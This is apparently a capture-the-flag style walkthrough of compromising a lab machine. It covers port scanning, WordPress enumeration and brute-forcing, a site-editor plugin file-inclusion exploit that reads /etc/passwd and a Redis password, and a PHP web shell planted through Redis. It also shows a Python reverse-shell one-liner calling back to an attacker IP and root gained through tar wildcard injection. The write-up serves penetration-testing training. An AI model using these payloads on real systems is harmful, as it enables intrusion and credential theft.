<h2>Recon</h2>

<h3>PortScanning</h3>

>command: sudo nmap -A 192.168.53.166 -p- -T4 -v

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/readys]
└─$ sudo nmap -A -p- 192.168.53.166 -T4 -oN readys -v
[sudo] password for bl4ck4non: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 00:08 WAT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 00:08
Completed NSE at 00:08, 0.00s elapsed
Initiating NSE at 00:08
Completed NSE at 00:08, 0.00s elapsed
Initiating NSE at 00:08
Completed NSE at 00:08, 0.00s elapsed
Initiating Ping Scan at 00:08
Scanning 192.168.53.166 [4 ports]
Completed Ping Scan at 00:08, 0.17s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:08
Completed Parallel DNS resolution of 1 host. at 00:08, 0.15s elapsed
Initiating SYN Stealth Scan at 00:08
Scanning 192.168.53.166 [65535 ports]
Discovered open port 80/tcp on 192.168.53.166
Discovered open port 22/tcp on 192.168.53.166
Increasing send delay for 192.168.53.166 from 0 to 5 due to 914 out of 2284 dropped probes since last increase.
Increasing send delay for 192.168.53.166 from 5 to 10 due to 21 out of 51 dropped probes since last increase.
SYN Stealth Scan Timing: About 5.28% done; ETC: 00:18 (0:09:16 remaining)
Discovered open port 6379/tcp on 192.168.53.166
SYN Stealth Scan Timing: About 6.77% done; ETC: 00:23 (0:14:00 remaining)
SYN Stealth Scan Timing: About 9.08% done; ETC: 00:25 (0:15:11 remaining)
SYN Stealth Scan Timing: About 17.39% done; ETC: 00:26 (0:14:20 remaining)
SYN Stealth Scan Timing: About 24.72% done; ETC: 00:26 (0:13:27 remaining)
SYN Stealth Scan Timing: About 30.02% done; ETC: 00:26 (0:12:31 remaining)
SYN Stealth Scan Timing: About 35.28% done; ETC: 00:26 (0:11:35 remaining)
SYN Stealth Scan Timing: About 41.46% done; ETC: 00:26 (0:10:41 remaining)
SYN Stealth Scan Timing: About 47.04% done; ETC: 00:27 (0:09:45 remaining)
SYN Stealth Scan Timing: About 52.63% done; ETC: 00:27 (0:08:47 remaining)
SYN Stealth Scan Timing: About 58.55% done; ETC: 00:27 (0:07:50 remaining)
SYN Stealth Scan Timing: About 64.22% done; ETC: 00:27 (0:06:50 remaining)
SYN Stealth Scan Timing: About 69.38% done; ETC: 00:27 (0:05:53 remaining)
SYN Stealth Scan Timing: About 74.54% done; ETC: 00:27 (0:04:54 remaining)
SYN Stealth Scan Timing: About 79.65% done; ETC: 00:27 (0:03:56 remaining)
SYN Stealth Scan Timing: About 84.74% done; ETC: 00:28 (0:02:57 remaining)
SYN Stealth Scan Timing: About 90.09% done; ETC: 00:28 (0:01:58 remaining)
SYN Stealth Scan Timing: About 95.28% done; ETC: 00:29 (0:00:58 remaining)
Completed SYN Stealth Scan at 00:29, 1263.58s elapsed (65535 total ports)
Initiating Service scan at 00:29
Scanning 3 services on 192.168.53.166
Completed Service scan at 00:30, 17.29s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 192.168.53.166
Retrying OS detection (try #2) against 192.168.53.166
Retrying OS detection (try #3) against 192.168.53.166
Retrying OS detection (try #4) against 192.168.53.166
Retrying OS detection (try #5) against 192.168.53.166
Initiating Traceroute at 00:30
Completed Traceroute at 00:30, 0.36s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 00:30
Completed Parallel DNS resolution of 2 hosts. at 00:30, 0.23s elapsed
NSE: Script scanning 192.168.53.166.
Initiating NSE at 00:30
Completed NSE at 00:30, 9.13s elapsed
Initiating NSE at 00:30
Completed NSE at 00:30, 0.97s elapsed
Initiating NSE at 00:30
Completed NSE at 00:30, 0.00s elapsed
Nmap scan report for 192.168.53.166
Host is up (0.36s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74ba2023899262029fe73d3b83d4d96c (RSA)
|   256 548f79555ab03a695ad5723964fd074e (ECDSA)
|_  256 7f5d102762ba75e9bcc84fe27287d4e2 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-generator: WordPress 5.7.2
|_http-title: Readys &#8211; Just another WordPress site
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
6379/tcp open  redis   Redis key-value store
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=3/3%OT=22%CT=1%CU=36083%PV=Y%DS=2%DC=T%G=Y%TM=6401319E
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=103%TI=Z%TS=A)SEQ(SP=102%GCD
OS:=1%ISR=103%TI=Z%II=I%TS=9)OPS(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11
OS:NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE8
OS:8%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)
OS:T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%
OS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164
OS:%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 8.315 days (since Wed Feb 22 16:56:29 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   358.90 ms 192.168.49.1
2   358.91 ms 192.168.53.166

NSE: Script Post-scanning.
Initiating NSE at 00:30
Completed NSE at 00:30, 0.00s elapsed
Initiating NSE at 00:30
Completed NSE at 00:30, 0.00s elapsed
Initiating NSE at 00:30
Completed NSE at 00:30, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1318.58 seconds
           Raw packets sent: 73390 (3.234MB) | Rcvd: 70594 (2.828MB)

```
Alright, we have 3 opened ports from our scan. Port 22 which runs ssh, port 80 which runs http and port 6379 which runs the redis service. Our enumeration today will be focused on port 80 and port 6379



<h2>Enumeration Port 80</h2>

Going to the webpage you should get something like this

![image](https://user-images.githubusercontent.com/67879936/222588751-5bb28530-2c33-4064-b4d5-bc36aefccceb.png)

The webpage is running on wordpress. Lets go ahead and fuzz for hidden directories using ffuf

>command: ffuf -u "http://192.168.53.166/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup

```
┌──(bl4ck4non㉿bl4ck4non)-[~]
└─$ ffuf -u "http://192.168.53.166/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.53.166/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .zip .sql .php .phtml .bak .backup 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 13022, Words: 732, Lines: 190, Duration: 470ms]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 583ms]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 204ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 201ms]
wp-admin                [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 246ms]
wp-blog-header.php      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 428ms]
wp-content              [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 461ms]
wp-cron.php             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 460ms]
wp-config.php           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 468ms]
wp-load.php             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 218ms]
wp-links-opml.php       [Status: 200, Size: 221, Words: 12, Lines: 12, Duration: 230ms]
wp-includes             [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 241ms]
wp-mail.php             [Status: 403, Size: 2593, Words: 190, Lines: 121, Duration: 309ms]
wp-login.php            [Status: 200, Size: 8177, Words: 399, Lines: 104, Duration: 321ms]
wp-signup.php           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 182ms]
wp-settings.php         [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 185ms]
wp-trackback.php        [Status: 200, Size: 135, Words: 11, Lines: 5, Duration: 318ms]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 338ms]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 212ms]
:: Progress: [32298/32298] :: Job [1/1] :: 129 req/sec :: Duration: [0:04:08] :: Errors: 0 ::
```

Alright, now that our scan is done lets run wpscan (a wordpress bruteforce tool)

>command: wpscan --url http://192.168.53.166/ --enumerate p --enumerate t --enumerate u

```
┌──(bl4ck4non㉿bl4ck4non)-[~]
└─$ wpscan --url http://192.168.53.166/ --enumerate p --enumerate t --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://192.168.53.166/ [192.168.53.166]
[+] Started: Fri Mar  3 00:47:31 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.53.166/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.53.166/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.53.166/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.53.166/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.7.2 identified (Insecure, released on 2021-05-12).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.53.166/index.php/feed/, <generator>https://wordpress.org/?v=5.7.2</generator>
 |  - http://192.168.53.166/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.7.2</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://192.168.53.166/wp-content/themes/twentytwentyone/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://192.168.53.166/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.7
 | Style URL: http://192.168.53.166/wp-content/themes/twentytwentyone/style.css?ver=1.3
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.53.166/wp-content/themes/twentytwentyone/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <==========================================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.53.166/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Mar  3 00:47:46 2023
[+] Requests Done: 63
[+] Cached Requests: 6
[+] Data Sent: 15.251 KB
[+] Data Received: 12.678 MB
[+] Memory used: 203.414 MB
[+] Elapsed time: 00:00:15

```
From our scan we found a username ```admin```, lets try to brutefoce the password now that we got a username

>command: wpscan --url http://192.168.53.166/ -U admin -P /home/bl4ck4non/Documents/rockyou.txt

```
┌──(bl4ck4non㉿bl4ck4non)-[~]
└─$ wpscan --url http://192.168.53.166/ -U admin -P /home/bl4ck4non/Documents/rockyou.txt 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.53.166/ [192.168.53.166]
[+] Started: Fri Mar  3 00:53:52 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.53.166/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.53.166/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.53.166/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.53.166/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.7.2 identified (Insecure, released on 2021-05-12).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.53.166/index.php/feed/, <generator>https://wordpress.org/?v=5.7.2</generator>
 |  - http://192.168.53.166/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.7.2</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://192.168.53.166/wp-content/themes/twentytwentyone/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://192.168.53.166/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.7
 | Style URL: http://192.168.53.166/wp-content/themes/twentytwentyone/style.css?ver=1.3
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.53.166/wp-content/themes/twentytwentyone/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] site-editor
 | Location: http://192.168.53.166/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.53.166/wp-content/plugins/site-editor/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:08 <=========================================================================================> (137 / 137) 100.00% Time: 00:00:08

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
^Cying admin / iluvpink Time: 00:16:38 <                                                                                       > (9479 / 14344392)  0.06%  ETA: ??:??:??
[i] No Valid Passwords Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.                                             > (9484 / 14344392)  0.06%  ETA: ??:??:??
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Mar  3 01:10:50 2023
[+] Requests Done: 9628
[+] Cached Requests: 36
[+] Data Sent: 3.148 MB
[+] Data Received: 81.115 MB
[+] Memory used: 295.383 MB
[+] Elapsed time: 00:16:58

Scan Aborted: Canceled by User

```
the scan didn't find a valid password for the username. But take a look at the scan above again you will observe we found a plugin ```site-editor 1.1.1``` and this plugin has an available exploit online

![image](https://user-images.githubusercontent.com/67879936/222600553-4980395d-a670-4d90-97ad-a85e3158bc7f.png)




<h2>Exploitation</h2>

Link to Exploit:https://www.exploit-db.com/exploits/44340

From this exploit there's something I want us to take a look at

![image](https://user-images.githubusercontent.com/67879936/222601462-a60dc797-7a81-4c0a-8606-dccaed6684c3.png)

The Proof of Concept gives us a link that will help in revealing the ```/etc/passd``` file

Link:http://192.168.53.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

![image](https://user-images.githubusercontent.com/67879936/222602097-5487922f-cb27-4e0c-b979-f717dd4dd8b9.png)

cool, we can view the ```/etc/passwd``` file. If you recall there was a ```redis``` service running on port 6379, lets try to read the config file

Link:http://192.168.53.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/redis/redis.conf

![image](https://user-images.githubusercontent.com/67879936/222605012-7aaabf93-227a-45bf-a5dd-8033802b2b1d.png)

cool, I think we found a password ```Ready4Redis?```. We can use this password to log in to the redis service

>command: redis-cli -h 192.168.53.166

#To install redis-cli ```sudo apt-get install redis-tools```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/readys]
└─$ redis-cli -h 192.168.53.166                
192.168.53.166:6379> AUTH Ready4Redis?
OK
192.168.53.166:6379> info
# Server
redis_version:5.0.14
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:ddd3b1f304a7d4d5
redis_mode:standalone
os:Linux 4.19.0-18-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:8.3.0
process_id:460
run_id:f726c50d853e2c33955c1b4ae907e980ba9e8f29
tcp_port:6379
uptime_in_seconds:7093
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:83861
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Clients
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0

# Memory
used_memory:859168
used_memory_human:839.03K
used_memory_rss:12722176
used_memory_rss_human:12.13M
used_memory_peak:859168
used_memory_peak_human:839.03K
used_memory_peak_perc:100.00%
used_memory_overhead:845942
used_memory_startup:796248
used_memory_dataset:13226
used_memory_dataset_perc:21.02%
allocator_allocated:1270368
allocator_active:1626112
allocator_resident:8617984
total_system_memory:2091155456
total_system_memory_human:1.95G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.28
allocator_frag_bytes:355744
allocator_rss_ratio:5.30
allocator_rss_bytes:6991872
rss_overhead_ratio:1.48
rss_overhead_bytes:4104192
mem_fragmentation_ratio:15.57
mem_fragmentation_bytes:11905008
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:49694
mem_aof_buffer:0
mem_allocator:jemalloc-5.1.0
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1677798368
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

# Stats
total_connections_received:13
total_commands_processed:5
instantaneous_ops_per_sec:0
total_net_input_bytes:504
total_net_output_bytes:15418
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

# Replication
role:master
connected_slaves:0
master_replid:c635f66ed03683ea43874cdef9961151ed3778ad
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:4.584850
used_cpu_user:2.486765
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000

# Cluster
cluster_enabled:0

# Keyspace
192.168.53.166:6379> 

```
Now, we are logged in. To be exploit this, we'll upload a shell to the webserver

You can read more about it here: https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis

```
config set dir /dev/shm
config set dbfilename abeg.php
set test "<?php system($_GET['cmd']); ?>"
save
```
```
192.168.53.166:6379> config set dir /dev/shm
OK
192.168.53.166:6379> config set dbfilename abeg.php
OK
192.168.53.166:6379> set test "<?php system($_GET['cmd']); ?>"
OK
192.168.53.166:6379> save
OK
192.168.53.166:6379> 
```
Now, lets acces the created file in our webserver

Link:http://192.168.53.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/dev/shm/abeg.php&cmd=id

![image](https://user-images.githubusercontent.com/67879936/222606641-017a4689-d4c9-4b5b-a081-c6929c331b22.png)

it worked, nice. Now, lets try to upload a shell so we can get a reverse shell back on our machine

payload:```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.53",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'```

>Note: The IP and Port will be different from yours, The IP should be your own IP address not the target, while the port number should be one you want netcat to listen to

Link:192.168.53.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/dev/shm/abeg.php&cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.49.53%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/sh%22)%27

Going to this link and setting up your netcat listener, you should get a shell as user "Alice"

![image](https://user-images.githubusercontent.com/67879936/222607346-dc67666f-1e73-4ef1-bc36-3005f82cc72a.png)

Now that we are logged in, lets go ahead and escalate our privileges



<h2>Privilege Escalation</h2>

It seems there's a cronjob running on this machine

>command: cat /etc/crontab

![image](https://user-images.githubusercontent.com/67879936/222608098-58a4a145-6cc2-40c5-9592-16f309c984e8.png)

What the ```backup.sh``` script does is that it performs a regular backup of a website's file based on recent modifications (within the last 3 mins)

Here, we'll be exploiting the ```tar``` binary because it is vulnerable to wildcard injection

you can read more about wildcard injection here:https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/

```
echo "chmod +s /bin/bash" > abeg.sh
echo "" > "--checkpoint-action=exec=sh abeg.sh"
echo "" > "--checkpoint-action=exec=sh abeg.sh"
ls -l /bin/bash
```

![image](https://user-images.githubusercontent.com/67879936/222609712-b563db6f-2b5c-4070-8a7c-c33a098c6e54.png)

nice, it worked hehe. Now lets try to get a shell as the root user

>command: /bin/bash -p

![image](https://user-images.githubusercontent.com/67879936/222612556-5785908b-270e-40d3-b939-dfed1a6d6cb6.png)

Boom!!! We got a shell as root

That will be all for today
<br> <br>
[Back To Home](../../index.md)








































